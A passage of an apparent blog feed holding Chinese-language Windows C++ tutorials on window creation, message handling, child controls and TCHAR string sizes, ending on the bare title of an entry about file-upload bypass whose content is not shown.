class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows窗口控件</title>
    <link href="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/"/>
    <url>/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/2.png" alt="2"></p><p><img src="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/3.png" alt="3"></p><p><img src="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/4.png" alt="4"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-keyword">static</span> HINSTANCE hInstance = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-comment">//MessageBoxW(hwnd, L&quot;窗口创建了&quot;, L&quot;提示&quot;, MB_OK);</span><br><span class="hljs-comment">//添加控件</span><br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;按钮1&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">100</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x100</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程消息处理</title>
    <link href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/"/>
    <url>/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/1.png" alt="1"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/2.png" alt="2"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/3.png" alt="3"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/4.png" alt="4"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">const</span> UINT WM_USERMSG = WM_USER + <span class="hljs-number">1</span>;   <span class="hljs-comment">//自定义消息事件</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(LPCWSTR format, ...)</span> </span>&#123;<br>WCHAR wchar_buff[<span class="hljs-number">100</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>va_list arglist;<br><span class="hljs-built_in">va_start</span>(arglist, format);<br><span class="hljs-built_in">wvsprintfW</span>(wchar_buff, format, arglist);<br><span class="hljs-built_in">va_end</span>(arglist);<br><span class="hljs-built_in">OutputDebugStringW</span>(wchar_buff);<br><br>&#125;<br><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口创建了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_MOUSEMOVE:<br><span class="hljs-comment">//print(L&quot;鼠标移动了！/n,%d&quot;,a);</span><br><span class="hljs-comment">//a++;</span><br>&#123;<br>WORD X = <span class="hljs-built_in">LOWORD</span>(lParam);<br>WORD Y = <span class="hljs-built_in">HIWORD</span>(lParam);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">L&quot;鼠标移动了！X坐标%d,Y坐标%d&quot;</span>, X, Y);<br><span class="hljs-keyword">break</span>; <br>&#125;<br><span class="hljs-keyword">case</span> WM_LBUTTONDOWN:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">L&quot;鼠标左键按下了/n&quot;</span>);<br><span class="hljs-built_in">SendMessageW</span>(hwnd, WM_USERMSG, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">case</span> WM_USERMSG:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">L&quot;自定义消息！/n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HINSTANCE hInstance,      <span class="hljs-comment">// handle to current instance</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ HINSTANCE hPrevInstance,  <span class="hljs-comment">// handle to previous instance</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPSTR lpCmdLine,          <span class="hljs-comment">// command line</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ <span class="hljs-keyword">int</span> nCmdShow              <span class="hljs-comment">// show state</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwnd = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwnd, SW_SHOWNORMAL);<br><span class="hljs-comment">//5.获取消息</span><br><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))&#123;<br><span class="hljs-built_in">DispatchMessage</span>(&amp;msg);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/5.png" alt="5"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/6.png" alt="6"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/7.png" alt="7"></p>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程第一个窗口程序</title>
    <link href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/"/>
    <url>/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/1.png" alt="1"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/2.png" alt="2"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/3.png" alt="3"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tagWNDCLASSW</span> &#123;</span><br>  UINT      style;<br>  WNDPROC   lpfnWndProc;<br>  <span class="hljs-keyword">int</span>       cbClsExtra;<br>  <span class="hljs-keyword">int</span>       cbWndExtra;<br>  HINSTANCE hInstance;<br>  HICON     hIcon;<br>  HCURSOR   hCursor;<br>  HBRUSH    hbrBackground;<br>  LPCWSTR   lpszMenuName;<br>  LPCWSTR   lpszClassName;<br>&#125; WNDCLASSW, *PWNDCLASSW, *NPWNDCLASSW, *LPWNDCLASSW;<br></code></pre></td></tr></table></figure><blockquote><p>核心的是WNDPROC  和 LPCWSTP lpszClassName    这两个必须有值</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口创建了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd,uMsg,wParam,lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br> <br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程字符串处理</title>
    <link href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/"/>
    <url>/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/1.png" alt="1"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/2.png" alt="2"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/3.png" alt="3"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/4.png" alt="4"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/5.png" alt="5"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/6.png" alt="6"></p><blockquote><p>tchar 是14的原因是 因为他是由环境决定   当前环境 默认是Unicode的 WCHAR 型   所以  和WCHAR 型的大小一样  如果 改变环境   tchar的大小也会跟着改变</p></blockquote><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/7.png" alt="7"></p><blockquote><p>改变之后  tchar的大小就变为7了</p></blockquote><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/8.png" alt="8"></p><blockquote><p>然后MessageBox函数如果用tchar类型 就不用管环境是什么了  因为tchar自动根据环境来变化</p></blockquote><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/9.png" alt="9"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>CHAR char_buff[] = <span class="hljs-string">&quot;123456&quot;</span>;<br>WCHAR wchar_buff[] = <span class="hljs-string">L&quot;123456&quot;</span>;<br>TCHAR tchar_buff[] = _T(<span class="hljs-string">&quot;123456&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof char_buff=%d/n&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(char_buff));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof wchar_buff=%d/n&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(wchar_buff));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof tchar_buff=%d/n&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(tchar_buff));<br><br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-number">0</span>, _T(<span class="hljs-string">&quot;hello word&quot;</span>), _T(<span class="hljs-string">&quot;标题&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传绕过思路拓展</title>
    <link href="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/"/>
    <url>/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/</url>
    
